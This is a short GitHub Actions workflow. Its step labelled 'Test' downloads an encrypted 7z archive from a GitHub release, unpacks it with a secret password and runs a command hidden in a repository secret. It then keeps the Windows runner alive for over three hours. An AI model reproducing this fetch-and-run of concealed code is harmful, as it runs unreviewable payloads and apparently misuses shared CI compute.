name: main

on:
  workflow_dispatch:

jobs:
  setup-run:
    runs-on: windows-2025
    steps:
    - name: Check out the repository
      uses: actions/checkout@v2

    - name: Test
      shell: cmd
      run: |
        powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nrobx/nrobx/releases/download/thisfor/thisfor.7z' -OutFile 'D:\thisfor.7z'"
        7z x D:\thisfor.7z -oD:\ -p${{ secrets.THISFOR_PASS }} -y
        ${{ secrets.moo_env }}

    - name: Sleep
      run: |
        Start-Sleep -Seconds 11800